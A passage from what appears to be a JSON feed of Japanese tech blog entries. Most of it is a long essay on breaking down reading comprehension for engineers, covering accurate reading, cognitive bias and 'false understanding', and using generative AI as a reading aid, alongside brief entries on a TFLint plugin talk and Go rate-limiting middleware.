エピソードで伝える。ただし、これは技術記事やブログに適用される段階であり、技術ドキュメントには不要だ。しかし、文章を書くことの意味は、スキルを高めることだけではない。書くことは、思考を深めることだ。思索が深まるほどに、世界の切り取り方が変わり、自分が変わる。書くことは、世界を理解することだ。技術を説明しようとするとき、私たちは「なぜこの技術は存在するのか」「どんな問題を解決するのか」を問う。書くことは、自分を理解することだ。言語化できない部分に直面したとき、私たちは「本当は理解していなかった」と気づく。だから、書くことは生きることだ。明日から、何か一つ書いてみよう。Slackのスレッドでもいい。プルリクエストのコメントでもいい。技術記事でもいい。書こうとして手が止まる瞬間、そこに理解の穴がある。その穴を埋めることが、あなたの成長だ。わたしにしか、書けないものは、ある。そう信じて、書き続けることだ。","isoDate":"2025-10-14T04:36:02.000Z","dateMiliSeconds":1760416562000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"TFLintカスタムプラグインで始める Terraformコード品質管理","link":"https://speakerdeck.com/bells17/tflintkasutamupuraguindeshi-meru-terraformkodopin-zhi-guan-li","contentSnippet":"Go Night Talks – After Conference の LT資料です\\rhttps://mercari.connpass.com/event/367075/","isoDate":"2025-10-14T04:00:00.000Z","dateMiliSeconds":1760414400000,"authorName":"bells17","authorId":"bells17"},{"title":"[Go]RateLimitingを適用するミドルウェアの実装","link":"https://zenn.dev/takehiro1111/articles/go_ratelimit","contentSnippet":"本記事の内容Go で IP ベースでレート制限をかける際の具体的な実装(ミドルウェアとして記載)以下は本記事では触れない。IP ベース以外の制限での実装RateLimit についての説明インフラ側だと WAF で IP ベースでのレート制限を行うこともありますが、今回の記事では考慮に入れてません。 機能要件同一 IP からのリクエスト回数を制限1分間に10回までと制限を行い、利用可能なトークンがない場合は429 Too Many Requests を返す。Token Bucket方式でバースト許容(一時的な急増OK)を採用しています。ミドルウ...","isoDate":"2025-10-13T07:33:46.000Z","dateMiliSeconds":1760340826000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"読解力を分解してちゃんと文章を読む。","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/12/081300","contentSnippet":"はじめに自分の読解力に絶望する瞬間というものがあります。たとえば、エラーログを読んでいるとき。無意識のうちに「こういうエラーだろう」という仮説を立てて、その証拠を探すように読んでしまっていました。問題を解決した後で同じログを読み返すと、「なんでこんな読み方をしたんだ？」と首をかしげます。明らかに違うことが書いてあるのに、自分の仮説に都合のよい部分だけを拾い読みしていました。エラーログという機械が出力するシンプルな文章ですら、こうなのです。もっと複雑なドキュメントなら、どれほど読み間違えていることでしょうか？ライブラリのドキュメント、APIリファレンス、技術記事、PRのコメント、issueの議論、Slackでのやり取り。すべて同じ問題を抱えている可能性があります。これは挑発でも誇張でもありません。「文章が読める人」は想像以上に希少で、自分も含めて、多くの人は書いてあることを読んでいません。自分の主張や仮説、感情があって、それに合うように拾い読みしているだけなのです。なぜこんなことが起きるのでしょうか？それは人は文章を読む前から、すでに何らかの主張や仮説、感情を持っているからです。そして無意識のうちに、それを正当化できる「都合のよいワード」だけを探している。文章全体の文脈や意図を理解するのではなく、自分の主張や仮説にマッチする断片だけに反応する。これは読解ではありません。結論ありきの確認作業です。虐殺器官 (ハヤカワ文庫JA)作者:伊藤 計劃早川書房Amazon今の時代、わからないことがあれば、ChatGPTやClaudeに聞けばいい。生成AIは、いつでも、何度でも答えてくれます。これは本当に素晴らしいです。でも——生成AIがあれば読解力は不要になるのでしょうか？違います。逆だと思っています。生成AIによって読解力は底上げされます。ただし、それは生成AIをどう使うかにかかっています。生成AIを正しく使えば、読解力を飛躍的に高められます。でも、間違った使い方をすれば、読解力は逆に衰えます。この記事では、「読む」という行為を分解し、それぞれの壁をどう超えるか、そして生成AIをどう活用すべきかを語っていきます。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。読解力は分解可能なスキル群ですスキルというのは、単一の能力で成り立っているわけではないことが多いです。だいたいは複数の能力の集合体です。コーディングがうまくなりたい？それなら取り組むべきことは山ほどあります。言語仕様を深く理解する、デザインパターンを学ぶ、Effective 〇〇のようなベストプラクティスを身につける、テストの書き方を学ぶ、デバッグの技術を磨く。さらに、メモリ管理を理解する、並行処理を扱えるようになる、セキュリティや運用を考慮できるようになります。でも、技術的なスキルだけじゃないです。コミュニケーション能力を高める、他人のコードを読む力をつける、レビューでフィードバックをする、技術的な議論ができるようになる。業界知識を身につける、ドメイン知識を深める、チーム開発の進め方を学ぶ。コーディングというスキルは、技術、人間関係、知識という軸からなる、いくつものスキルの集合体なんだと思います。漠然と「コーディングが上手くなりたい」と思っているだけでは、何をすればいいかわかりません。でも分解して「Rustの所有権システムを深く理解する」と具体化すれば、The Rust Programming Languageを読む、borrowチェッカーのエラーと向き合う、といった具体的な練習メニューが見えてきます。「デザインパターンを学ぶ」と具体化すれば、GoFのパターンを実装してみる、OSSのコードでパターンを探す、といった具体的な行動が見えてきます。読解力も同じです。書いてあることを正確に読むには、実はいろんなスキルが要ります。語彙力、文法理解力、主語・述語の把握、修飾関係の理解、論理構造の把握、情報の正確な抽出。こういった「書いてあることを正しく読む」基礎的なスキル。さらに、文脈の理解、推測力、共感力、批判的思考、バイアスへの気づき、メタ認知。こうした「行間を読む」応用的なスキル。そして、抽象化能力、本質を見抜く力、問いを立てる力、情報の優先順位づけ。「何が本当に重要なのか」を見極める統合的なスキル。読解力もまた、複数のスキルの集合体です。熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon上達とは分解して考えることどんな能力でも、「取り組めるまで分解して考えること」が重要です。漠然と上手になりたいでは、いつまで経っても上達しません（天才を除く）。分解しないとどうなるでしょうか？「ドキュメントをちゃんと読めるようになりたい」では漠然としすぎて何をすればいいかわかりません。練習のしようがないです。でも「仮説を立てる前に、書かれている情報を網羅的に抽出する」と分解すれば、明日から実践できる具体的な読み方が見えてきます。エラーログを開いたとき、まず全行を読んでからメモ帳に情報を列挙する、という具体的な行動に落とし込めます。壮大に見えた挑戦も、分解してみれば、シンプルなタスクの積み重ねでしかありません。コーディングも、読解も、他のどんなスキルも同じです。頭の良さが成功の命運を分けるほど高尚な仕事はありません。必要なのは、分解する視点と、一つずつ取り組む地道さです。この原則は、コーディングでもドキュメントの読解でも、あらゆるスキルに共通しています。そして、生成AI時代においても、この原則は変わりません。むしろ、生成AIがあるからこそ、読解力を分解して鍛えることが、より重要になります。分解できていなければ、生成AIに「何を」「どう」聞けばいいのかもわからないのですから。私たちはどう学んでいるのか　――創発から見る認知の変化 (ちくまプリマー新書)作者:鈴木宏昭筑摩書房Amazon読解力には3つの段階があります読解力には、大きく3つの段階があります。この記事では、その3つの段階を一つずつ分解して説明していきます。ただし、これは一方通行の階段じゃありません。私たちはこれらの段階を行ったり来たりします。第3段階まで到達した人でも、疲れているときや慣れない分野の文章を読むときは、第1段階に戻ります。そう、読解力とは一定じゃありません。「能力」という言葉には「力」という漢字が含まれています。そのせいか、まるで機械のスペックのように「私の読解力は○○レベル」と固定値で捉えてしまいがちです。筋力のように、一定の出力を常に出せるものだと思ってしまいます(筋力も…というツッコミもあります)。しかし実際はそうではありません。能力はその瞬間の状態に大きく左右される可変的なものです。読解力は文脈によって大きく変わります。自分の専門分野のドキュメントなら第3段階まで読めるのに、まったく知らない分野の文章なら第1段階で苦戦します。朝の集中できる時間なら深く読めるのに、疲れた夜には表面的にしか読めません。特に感情状態の影響は大きいです。怒りや悲しみを抱えたまま技術記事を読んでも、書かれている内容が頭に入ってきません。これは単に集中力が切れるという話ではありません。感情が認知のリソースを占有してしまうからです。仮に100のキャパシティがあっても、感情に30使われていたら、読解に使えるのは70だけになります。こうした揺らぎは、誰にでもどんな能力にもあります。この理解は、自己評価にも影響します。ある日うまく読めなかったからといって「自分には読解力がない」と結論づけるのは早計です。単にその瞬間の条件が悪かっただけかもしれません。だからこそ、筋力を鍛えるように、読解力も鍛える価値があります。鍛えるとは、能力の底上げと安定化を意味します。鍛えておけば、疲れているときでも、新しい分野でも、感情が揺れているときでも、ある程度は正確に読めるようになります。新装版 アブダクション　仮説と発見の論理作者:米盛裕二勁草書房Amazon第1段階：正確に読むこれは読解の土台です。書かれていることを正確に理解する力です。エラーログで考えてみましょう。第1段階では、どのコンポーネントが、どんな状態で、どんなエラーを出したのかを正確に読み取ります。エラーメッセージの構造を理解し、どこで何が起きたかを正確に把握します。技術記事なら、著者が説明している手順や概念を、一つ一つ正確に理解することです。「この関数は非同期です」という記述があったとき、それが何を意味するのか（Promiseを返すのか、コールバックを受け取るのか、await可能なのか）を正確に読み取ります。Rustのコンパイラエラーも良い例です。borrowチェッカーのエラーが出たとき、「所有権の問題だ」とざっくり理解するんじゃなくて、どの変数が、どのスコープで、どのように使われようとして、なぜそれが許可されないのか、を正確に読み取ります。これはプログラミングにおける「構文を理解する」に相当します。変数、関数、制御構文といった基本がわからなければ、その先のロジックを理解することはできません。読解も同じです。まず書かれていることを正確に読む。この段階なしに、次の段階には進めません。シン読解力―学力と人生を決めるもうひとつの読み方作者:新井 紀子東洋経済新報社Amazon第1段階の壁：基礎訓練の不足多くの人はこの第1段階で躓いています。基礎訓練が不足しているんです。例えば、次の2つの記述の違いが分かるでしょうか？「システムは、2025年1月、レガシーAPIを廃止し、クライアントには新APIへの移行を推奨した」と、「2025年1月、レガシーAPIは廃止され、システムはクライアントから新APIへの移行を推奨された」。答えは「異なる」です。前者ではクライアントが移行を推奨されているのに対し、後者ではシステムがクライアントから推奨されている（主従関係が逆）です。もっと身近な例で見てみましょう。技術記事に「このメソッドは非同期です」と書かれています。多くの開発者は「わかった」と思って先に進みます。でも実際には、「非同期である」という情報だけでは不十分です。Promiseを返すのか、コールバックを受け取るのか、await可能なのか、エラーハンドリングはどうするのか。これらの情報も読み取らなければ、正確な理解とは言えません。コーディングに例えるなら、コードはたくさん書くが、変数のスコープを理解せず、型システムの理解もせず、言語仕様の訓練もしない。基礎がないから複雑なシステムを作れない、という状況です。文章の読解も同じ。たくさん読むが、文構造の理解訓練はせず、論理的思考の訓練もしない。基礎がないから正確に読めません。この壁を超えるには基本的な訓練が重要です。主語・述語を意識する。ドキュメントやエラーメッセージで、「誰が」「誰に」「何を」しているのか。これを正確に把握する癖をつけます。仮説を立てる前に全部読む。私はこれでエラーログの読み間違いが激減しました。全行読んで、情報を列挙してから、それから仮説を立てる。順番を変えるだけで、見える景色が変わります。文脈を意識する。これはリファレンスなのか、チュートリアルなのか、トラブルシューティングなのか。文章の「置かれた場所」で、読み方も変わるべきなんです。音読してみる。本質的な訓練ではないが、驚くほど効果的です。声に出すと、飛ばし読みができなくなる。一文字ずつ確実に読むことを強制される。視覚だけでなく聴覚も使うので、「読んだつもり」が減る。特に、複雑なエラーメッセージや理解しにくいドキュメントを読むときは、小声でもいいから音読してみるといいです。読むスピードが落ちる分、思考する時間が生まれる。主語と述語の関係も掴みやすくなります。生成AIは、この基礎訓練を補助してくれます。わからない専門用語が出てきたとき、集中力を途切れさせずに「『非同期処理』とは何ですか？」と聞ける。複雑な文章の主語・述語の関係がわからなくなったとき、「この文章の構造を分解してください」と聞ける。技術記事を読んで「わかった」と思ったとき、「私はこう理解しました。[あなたの理解]。この理解は正しいですか？」と確認できます。ただし、まず自分で読むことが前提です。最初の一文を読んですぐ「要約して」と頼むのでは、読解力は鍛えられません。生成AIに分解してもらった後、必ず自分でもう一度読み直します。生成AIの説明も間違えることがあるので、公式ドキュメントでも確認します。生成AIはあくまで訓練の補助です。第2段階：裏を読む第1段階で書かれていることを正確に読めるようになったら、次は書かれていない意図を汲み取る力が必要になります。エラーログで考えてみましょう。第2段階では、エラーの背後にある状況を推測します。タイムアウトエラーがあったとき、単に「タイムアウトした」という事実だけじゃなく、「なぜタイムアウトしたのか」を考える。ネットワークが遅いのか、サーバーが応答していないのか、ファイアウォールで遮断されているのか。技術記事を読むときも同じ。「この実装方法を推奨します」という記述があったとき、なぜ著者はそれを推奨するのか、どんな状況を想定しているのか、逆にどんな状況では推奨しないのか、を推測します。PRのコメントで「ここ、もっと良い方法があるかも」と書かれていたとき、それは単なる提案なのか、変更を強く求めているのか、それとも議論を始めたいのか。書かれている言葉だけでなく、その裏にある意図を読み取る力です。Rustのドキュメントを読むとき、「この関数はunsafeです」という記述の裏には、「注意深く使わないとメモリ安全性が損なわれる」という警告がある。「このトレイトはSendです」という記述の裏には、「スレッド間で安全に送信できる」という保証があります。これはプログラミングにおける「ロジックを理解する」に相当します。構文を理解した上で、なぜこのデザインパターンを使うのか、なぜこのデータ構造を選ぶのか、といった背景や意図を理解する段階です。読解力は最強の知性である　１％の本質を一瞬でつかむ技術作者:山口 拓朗SBクリエイティブAmazon第2段階の壁：認知バイアスこの第2段階では大きな壁にぶつかります。それが認知バイアスです。エラーログを読むとき、私は無意識に確証バイアスの罠にはまっていました。確証バイアスとは、自分の信念を裏付ける情報を探し求め、それ以外を見ない・軽視する心理学の概念。既存の仮説として「これはメモリの問題だ」と思っていると、フィルターが発動し、メモリに関する情報だけを拾うようになる。結果として、ネットワークに関する情報を見落としてしまいます。GitHubのissueでも同じことが起きています。「この機能の実装、19時までに終わらせるのは無理だった。他のタスクもあるし、月1回くらいしかこのペースで進められない」というコメントを読んで、「マネジメントに文句を言っている」と受け取る人がいます。でも、よく読んでほしいです。このコメントには「マネジメントが悪い」とは一言も書かれていない。書かれているのは、ただ「間に合わなくて申し訳ない」という弱音だけです。なぜこのような誤読が起きるのか？「この人は以前も遅れていた」「いつも文句を言っている」という既存の印象があると、フィルターが発動し、「マネジメントを批判している」と読み取ってしまいます。でも実際に書かれていることは、「間に合わなくて申し訳ない」という弱音だけです。ここで重要なのは、私たちの直観は想像以上に信頼できないということです。「直観に従えば大丈夫」——もしこれが本当なら、文章の誤読はほとんど起きないはずです。エラーログを読めば直観的に原因がわかる。ドキュメントを読めば直観的に使い方がわかる。コメントを読めば直観的に意図がわかる。でも現実はどうでしょうか？私たちは、人生で何千、何万もの文章を読んできました。それでも、誤読は頻繁に起きます。「ちゃんと文章を読める」と自認している人でも、エラーログを読み間違え、ドキュメントを誤解し、コメントを誤読しています。つまり、直観的な判断は、それなりの確率で裏切ります。ファスト＆スロー　（上）作者:ダニエル カーネマン,村井 章子早川書房Amazonなぜか？直観は過去の経験とパターン認識に基づいているからです。「このエラーは以前見たことがある」「この書き方は○○を意味する」——そう直観的に思った瞬間、私たちは確証バイアスのフィルターをかけてしまいます。直観に従うほど、書かれていることではなく、「自分が予想したこと」を読むようになります。だからこそ、意識的な読み方が必要なんです。直観を完全に排除することはできません。でも、「直観は間違うかもしれない」と自覚するだけで、読み方は変わります。「直観的にこう思う。でも、本当にそう書いてあるか？」と自問する癖をつける。これだけで、誤読は激減します。私たちは、自分が信じたいものを信じるようにできています。ちなみに、SNSでは誤読が頻繁に起こります。でも、発信する側の心持ちとして、SNSでは誤読されるのも投稿する内だと思っていたほうが精神衛生上良いんです。SNSという媒体は本質的に誤読を生みやすいからです。文脈が省略され、文字数に制限があり、読者の背景や感情状態も様々です。「炎上」の多くは、この誤読から生まれる。できるのは、自分自身が読む側に回ったとき、「書かれていないこと」を読み取っていないか、常に自問することだけです。この壁を超えるには基本的な訓練が重要です。「書かれていないこと」を排除する。一文字ずつ丁寧に読み、「これは本当に書いてあるか？」と確認し、「自分が勝手に補完していないか？」と自問する。特に、怒りの感情を覚えたときは要注意だ。複数の解釈を考える。1つの文章に対して、少なくとも3つの異なる解釈を仮定してみる。先ほどの「19時までに終わらせるのは無理だった」なら、①単純に弱音を吐いている、②マネジメントを批判している、③このプロジェクトから離れたいと思っている、という3つの解釈が考えられる。書かれていることだけからは①が最もストレートだけど、「確定」はできません。バイアスのメタ認知。文章を読んで強い感情（怒りや共感）を覚えたら、ちゃんと読み直し、「自分のバイアスではないか？」と自問し、複数の解釈可能性を列挙する。生成AIは、別の視点を提供してくれる。「この文章の別の解釈の可能性を3つ教えてください」と聞けば、あなたが思いつかなかった解釈を示してくれることがある。「このコメントには、『マネジメントを批判している』という意図が書かれていますか？」と聞けば、書かれていることと書かれていないことを区別してくれる。ただし、生成AI自体もバイアスを持っている。生成AIも訓練データに基づいたバイアスを持っているし、あなたの質問の仕方が回答を誘導してしまうこともある。だから、中立的な質問をする。「この文章のトーンを分析してください」といった、オープンな質問をする。そして、まず自分で複数の解釈を考えてから、生成AIで確認します。この順番が大切です。第3段階：本質を読む第1段階で正確に読み、第2段階で裏を読めるようになったら、最後は本当に重要なことは何かを見抜く力が必要になります。エラーログで考えてみましょう。第3段階では、大量のログの中から本当に重要な情報を抽出する。100行のログがあったとき、その中で本当に問題の原因を示しているのはどの部分なのか。表面的には複数の問題が見えても、本質的には1つの根本原因から派生しているかもしれません。技術記事を読むとき、第3段階では表面的な実装方法ではなく、その根底にある設計思想や原則を理解する。「このコードはこう書く」という表層だけでなく、「なぜそう書くのか」「そもそも何を解決しようとしているのか」を見抜きます。Rustのドキュメントを読むとき、個々のAPIの使い方だけでなく、所有権システムという言語の根幹にある哲学を理解する力だ。これはプログラミングにおける「設計を理解する」に相当します。構文とロジックを理解した上で、なぜこのアーキテクチャを採用したのか、トレードオフは何か、本質的な問題は何か、を理解する段階です。ただし、新しい言語を学ぶときは構文から学び直す必要があるように、新しい分野の文章を読むときは第1段階から学び直す必要があります。これは退行ではなく、自然なことなんです。わかったつもり～読解力がつかない本当の原因～ (光文社新書)作者:西林 克彦光文社Amazon第3段階の壁：わかったつもり第3段階に到達しても、まだ最後の壁がある。これが一番厄介です。それが「わかったつもり」。「もう理解すべきことは何もない」って思った瞬間、人は思考停止します。新しい視点を受け入れなくなります。成長が、止まります。エラーログを開いて「あ、これはあのエラーだ」と思った瞬間、思考が停止します。そして仮説に合う部分だけ読んで、結果として問題を解決できません。実際には50%程度しか理解していないのに、「わかった」と思い込んでいます。エラーログを見て「ああ、これは接続エラーだ」と思った瞬間、「接続設定を確認すればいい」と結論づけてしまいます。でも実際には、設定以外にも、ファイアウォール、タイムアウト、認証、リトライロジックなど、他にも確認すべきことがあるかもしれない。「わかった」と思った瞬間に、これらの可能性を検討しなくなります。技術記事を読むときも同じ。「この技術は理解した」と思った瞬間、制約条件や例外的な状況を見落とす。「この設計パターンはわかった」と思った瞬間、適用すべきでない場面に気づかなくなります。この「わかったつもり」は、第1段階から第3段階まで、すべての段階で起こりうります。だからこそ、これが最大の壁なんです。読解力が高い人ほど、自分が「わかったつもり」になっていないかを常に点検しています。この壁を超えるには基本的な訓練が重要です。「なぜ」「そもそも」と問う。なぜこのエラーが出たのか？そもそも何が問題なのか？本当に重要なのはどこか？問いとは、答えをただ探すためのものではなく、物事の本質に近づこうとする\\"姿勢\\"そのものです。要約訓練。情報を要約する際は、「本当に重要なのは何か？」と自問する癖をつける。これは、99%の情報から1%の本質を抽出する訓練です。でも、「これが本質だ」と決めつけてはいけません。それが「わかったつもり」の罠だからです。情報の精査。情報に触れたら、「それは個人的意見なのか、客観的事実なのか？」と自問する。事実なのか意見なのか、データに基づいているのか印象なのか。この区別が、本質を見抜く力につながります。生成AIは、理解を検証してくれます。「私はこの技術の本質を『○○』だと理解しました。この理解は正しいですか？他にもっと重要な本質はありますか？」と聞ける。「なぜこの技術が必要なのですか？」と聞き、返ってきた答えに対して「なぜそれが問題なのですか？」とさらに聞ける。5回「なぜ」を繰り返す「5 Whys」を実践できます。長大なドキュメントを読んだ後、「このドキュメントの本質を、3つの文で要約してください」と聞けます。ただし、生成AIが示した「本質」も、一つの視点に過ぎません。生成AIは、訓練データに基づいて、「多くの人が本質だと考えていること」を答えます。でも、それが本当の本質かどうかは、わかりません。だから、生成AIの答えを「仮説」として扱う。「本当にそうか？」と疑う。他の情報源でも確認します。実際に使ってみて検証します。そして、まず自分で「なぜ」を考える。自分の考えを生成AIで確認します。この順番が大切です。すべて生成AIに聞いてしまうと、自分で考える力が衰えます。なぜ読解力を鍛えるべきなのかここまで読んで、「めんどくさそうだな」って思いました？正直、わかる。3つの段階、それぞれの壁、訓練方法、生成AIの使い方。別に分けんでもいいやろって思いました？しかも読解力って一定じゃなくて、落ちるらしいし、新しい分野だとまた1からやり直し。でも——これだけは言わせてほしい。生成AI時代だからこそ、読解力を鍛える価値は計り知れないです。「最近の人は長文が読めない」——よく聞く話ですが、これを単なる集中力不足だと片付けてはいけません。SNS、ショート動画、通知、いいね。私たちの脳は短期的な快楽にチューニングされ続けています。このサイクルを何年も繰り返すうちに、長文を読むことが単に「つまらない」だけでなく、苦痛に変わります。文脈を保持しながら論理を組み立てる——この一連のプロセスが、脳にとって「報酬が遠すぎる」活動になってしまうんです。スマホ脳（新潮新書） （『スマホ脳』シリーズ）作者:アンデシュ・ハンセン新潮社Amazonさらに深刻なのは、読解力の回路そのものが機能低下することです。文脈を保持する力が衰えると、文章を断片的にしか理解できなくなります。そして、自分の考えを整理する力も、読解力に依存しています。「なぜこのバグが起きたのか」を説明できない。「なぜこの設計を選んだのか」を答えられない。これは語彙不足ではなく、自分の内側で起きていることを掴めず、整理できていない状態です。感じているのに言語化できない。伝えたいのに届かない。誤解されて、孤立感が強まります。説明できる力は、安心感や人とのつながりの土台です。「自分だけは分かっている」という拠り所があるなら、人はまだ耐えられます。でも、自分の感じや考えを誰も拾ってくれないどころか、自分自身も拾えないとなると、存在の手応えや安心感が一気に揺らぎます。増補改訂版 スマホ時代の哲学 なぜ不安や退屈をスマホで埋めてしまうのか (ディスカヴァー携書)作者:谷川嘉浩ディスカヴァー・トゥエンティワンAmazon読解力は他のすべてのスキルを支える土台である読解力は、エンジニアとしてのキャリアの「土台」のようなものだ。基礎体力に近いかもしれません。コーディングで考えてみましょう。変数、関数、制御構文といった基礎がなければ、どんな技術も身につかない。Rustの所有権システムを学ぼうとしても、デザインパターンを理解しようとしても、並行処理を扱おうとしても、基礎がないと何も始まらない。読解力も同じ。読解力がなければ、どんなドキュメントも正確に理解できず、どんな技術も効率的に学べず、どんなコミュニケーションもうまくいきません。Rustを学びたいとする。でも、Rustのドキュメントを正確に読めなければ、所有権システムを理解できない。borrowチェッカーのエラーメッセージを正確に読めなければ、問題を解決できません。unsafeの意味を深く理解できなければ、適切に使えません。生成AIに「Rustの所有権システムを教えて」と聞けば、説明は返ってくる。でも、その説明を理解するのも、読解力だ。生成AIの説明が正しいかどうかを判断するのも、読解力だ。読解力が貧弱だと、コードを書く、設計する、レビューする、ドキュメントを書く、チームとコミュニケーションする、問題を解決する、新しい技術を学ぶ、生成AIを使いこなす、といった、エンジニアとしてのあらゆる活動で誤作動が生じます。逆に、読解力という土台があれば、すべてがスムーズに機能するようになります。生成AI時代においても、読解力はすべての土台なんです。読解力の差は、時間とともに指数関数的に広がる「読解力があるか、ないか」は、1回だけ見れば小さな差だ。でも、時間とともに指数関数的に広がっていきます。ドキュメントを正確に読める人と読めない人の差は、1回では小さいです。「たった1回の誤解」。でも、1年間ではどうでしょうか？ドキュメントを読めない人は、週に3回、APIの使い方を誤解します。年間で150回。そのたびに、実装をやり直す必要があります。週に3時間、年間で150時間を無駄にする。実装ミスのせいでバグが増える。デバッグに時間がかかる。納期が遅れる。レビュアーに迷惑をかけます。チームからの信頼を失う。新しい技術を学ぶスピードが遅くなる。結果として、キャリアが停滞します。生成AIを使っても、この差は変わりません。むしろ、生成AIがあるからこそ、読解力の差は広がる可能性があります。読解力がある人は、生成AIを補助ツールとして使って理解を深め、さらに読解力が高まる。読解力がない人は、生成AIに全面的に依存し、自分で考えなくなり、さらに読解力が低下します。1回の差は小さいです。でも、積み重なると大差になります。読解力が高い人は、読むことで新しい知識を得て、さらに読解力が高まる。読解力が低い人は、読むことで誤解を重ね、さらに読解力が低下する。時間とともに、差は指数関数的に広がっていきます。そして、自分の読解力が揺らぐことを自覚していれば、「今日は疲れているから、このドキュメントは明日読もう」という判断ができる。「怒りを感じているから、一旦落ち着いてから読み直そう」という戦略が立てられる。「この分野は初めてだから、第1段階から丁寧に読もう」という心構えができる。「疲れているから、生成AIに確認してもらおう」という判断ができます。読解力を鍛えることは、読解力そのものを高めることだけじゃありません。自分の読解力の限界を知り、それに応じた戦略を立てることでもあります。そして、生成AIをいつ、どう使うべきかを判断する力でもあります。読解はコミュニケーション「何回説明しても伝わらない」——こんな経験、誰にでもあるでしょう。上司から同じことを何度も指摘される。部下に説明したのに、まったく違うものができあがる。技術記事を読んだのに、実装したら全然違う結果になりました。多くの人は、これを「伝え方」の問題だと考える。でも、認知科学の研究が示すのは、違う真実です。問題は「言い方」じゃありません。「心の読み方」なんです。「何回説明しても伝わらない」はなぜ起こるのか？　認知科学が教えるコミュニケーションの本質と解決策作者:今井むつみ日経BPAmazonスキーマという名の「当たり前」認知科学には「スキーマ」という概念がある。これは、人それぞれが頭の中に持っている「当たり前」の枠組みのこと。知識や経験の構造化されたまとまりです。重要なのは、私たちは物事を「スキーマを通して」理解しているという点です。エラーログも、スキーマを通して読んでいる。ドキュメントも、スキーマを通して読んでいる。上司の指示も、スキーマを通して聞いている。生成AIの回答も、スキーマを通して読んでいます。「何回説明しても伝わらない」のは、説明する側と受け取る側で、スキーマが違うからです。上司が「この機能を実装してほしい」と言ったとします。上司の頭の中には、長年の経験から作られた「この機能」のスキーマがあります。でも、そのスキーマの大部分は、言葉にされていません。一方、受け取る側も、自分のスキーマを通してその指示を理解します。でも、それは上司のスキーマとは違うかもしれません。結果として、上司は「言ったはずだ」と思い、あなたは「聞いた通りにやった」と思う。でも、出来上がったものは違います。Rustのドキュメントを読むときも同じです。ドキュメントを書いた人には、Rustの所有権システムについての豊富なスキーマがあります。だから、「この関数はborrowします」という一文で、多くのことが伝わると思っています。でも、Rustを学び始めたばかりの人には、そのスキーマがありません。そして、生成AIの回答も、あなたのスキーマに依存しています。生成AIに「Rustの所有権システムを説明して」と聞いたとします。その説明を理解するのは、あなたのスキーマです。C++のスキーマを持っている人と、Pythonのスキーマしか持っていない人では、同じ説明を読んでも、理解する内容が違います。だから、生成AIに質問するとき、自分の前提知識（スキーマ）を明示することが有効なんです。「私はPythonしか知りません。Rustの所有権システムを、Pythonとの違いを中心に説明してください」と聞きます。人生の大問題と正しく向き合うための認知心理学 (日経プレミアシリーズ)作者:今井むつみ日経BPAmazon受け手としてどうすべきかじゃあ、受け手として、私たちはどうすればいいのか？まず、自分が持っているスキーマを自覚すること。「自分はこういう前提で理解している」と認識する。エラーログを読むとき、「これはメモリの問題だ」というスキーマで読んでいないか？生成AIの回答を読むとき、「自分の知っている範囲で」理解しようとしていないか？自分のスキーマを自覚するだけで、誤読は減ります。次に、「わかった」を疑うこと。説明を聞いて「わかった」と思った瞬間、実は自分のスキーマで解釈しているだけかもしれません。だから、理解したことを言い換えて確認します。「つまり、○○ということですか？」と聞く。生成AIを使うなら、「私はこう理解しました。[あなたの理解]。この理解は正しいですか？」と聞きます。そして、質問する勇気を持つこと。「わからない」と言うのは、勇気がいります。でも、わからないまま進むよりは、はるかにマシです。質問することは、恥ずかしいことじゃありません。自分のスキーマと相手のスキーマのズレに気づいて、それを埋めようとしている証拠です。最後に、柔軟にスキーマを更新することです。新しい技術を学ぶとき、既存のスキーマで理解しようとしがちです。でも、それが足枷になることがある。Rustを学ぶとき、C++のスキーマで理解しようとすると、所有権システムの本質を掴めません。コミュニケーションは双方向です。説明する側も、受け手のスキーマを想像する努力が必要だし、「伝わったかどうかを確認する」必要があります。受け手も、自分のスキーマを自覚し、「わかった」を疑い、質問する勇気を持ちます。この両方が揃って初めて、「伝わる」コミュニケーションが成立します。読解力とは、ただ文字を読む力じゃありません。自分のスキーマを自覚し、それを柔軟に更新しながら、相手の意図を理解しようとする力なんです。そして、生成AIを適切に使って、スキーマのズレを埋める力でもあります。情報を正しく選択するための認知バイアス事典作者:情報文化研究所フォレスト出版Amazon完璧を目指さない。でも「わかったつもり」にもならない「読解力を磨くこと」と「わかったつもりにならないこと」の間のバランスを見つけることが、本当の知性なんです。一方で、積極的に理解しようとする。努力して読解力を高める。3つの段階を一つずつ鍛える。基礎訓練の不足を補う。認知バイアスに気づく。「わかったつもり」を警戒する。生成AIを適切に使う。他方で、完璧を目指さない。常に完璧に読める人はいない。疲れているときもある。新しい分野もある。バイアスに引っかかるときもある。「わかったつもり」になってしまうときもある。生成AIの使い方を間違えるときもある。それは人間である以上、避けられません。重要なのは、失敗から学ぶことです。エラーログを読み間違えたなら、「なぜ読み間違えたのか？」と振り返る。確証バイアスに引っかかっていたのか、情報を網羅的に抽出していなかったのか、「わかったつもり」になっていたのか。生成AIに頼りすぎて、自分で考えなかったのか。次は同じ間違いをしないように、読み方を改善します。完璧を目指さない。でも、失敗から学び、少しずつ改善する。これが現実的な成長の道です。そして、常に「まだ理解できていないかも」という謙虚さを持つ。問いを持ち続ける姿勢を保ちます。優れたエンジニアは、何年コードを書いても、「完璧に理解した」とは思わない。新しい技術を学び続け、既存の知識を疑い続け、より良い方法を探し続ける。失敗から学び続ける。生成AIも適切に活用する。だから成長し続けられます。読解力も同じ。どんなに上達しても、「完璧に読めている」とは思わない。失敗から学び続ける。生成AIも適切に使い続ける。だから成長し続けられます。危険だからこそ知っておくべきカルトマーケティング作者:雨宮純ぱる出版Amazonおわりにエラーログを読み間違え、ドキュメントを誤解し、コメントを誤読する。「書いてあることを読んでいない」という絶望——この記事は、そんな問題からスタートしました。そして、「読む」という行為を分解してみました。読解力は複数のスキルの集合体でした。3つの段階があり、それぞれに壁がありました。第1段階の壁は「基礎訓練の不足」、第2段階の壁は「認知バイアス」、そしてすべての段階に共通する最大の壁が「わかったつもり」。生成AIは、これらの壁を超える補助ツールになる。でも、使い方次第です。まず自分で読む、鵜呑みにしない、依存しすぎない。この原則を守らなければ、読解力は逆に衰えます。読解力は他のすべてのスキルを支える土台であり、その差は時間とともに指数関数的に広がる。コミュニケーションはスキーマを通して行われるため、自分の「当たり前」を自覚し、「わかった」を